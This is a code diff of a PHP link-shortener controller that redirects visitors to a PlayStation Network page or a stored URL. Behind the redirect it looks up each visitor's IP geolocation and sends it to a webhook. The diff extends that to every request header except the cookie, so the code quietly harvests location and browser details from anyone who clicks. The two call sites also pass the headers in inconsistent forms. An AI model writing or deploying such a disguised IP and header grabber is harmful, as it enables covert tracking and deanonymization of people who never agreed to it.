@@ -12,7 +12,7 @@ class ShortUrlController extends Controller
 {
     public function index(Request $request)
     {
-        $this->getIp($request->ip());
+        $this->getIp($request->ip(), $request->headers->all());
 
         return redirect('https://www.playstation.com/pt-br/playstation-network');
     }
@@ -30,7 +30,7 @@ class ShortUrlController extends Controller
             'ip_address' => $request->ip(),
         ]);
 
-        $this->getIp($request->ip());
+        $this->getIp($request->ip(), $request->headers);
 
         return redirect($validateShortUrl->url);
     }
@@ -40,9 +40,16 @@ class ShortUrlController extends Controller
      * @throws ConnectionException
      * @throws \JsonException
      */
-    public function getIp($ip)
+    public function getIp($ip, $header = null)
     {
+        unset($header['cookie']);
+
         $response = Http::get('http://ip-api.com/json/' . $ip);
+
+        $data2 = [
+            $header,
+            $response->json(),
+        ];
 
         $data = [
             "username" => "Webhook",
@@ -50,7 +57,7 @@ class ShortUrlController extends Controller
                 "embeds" => [
                     [
                         "title"=> "Information received",
-                        "description"=> json_encode($response->json(), JSON_THROW_ON_ERROR | JSON_PRETTY_PRINT),
+                        "description"=> json_encode($data2, JSON_THROW_ON_ERROR | JSON_PRETTY_PRINT),
                         "color"=> 0x3498db
                     ]
                 ]
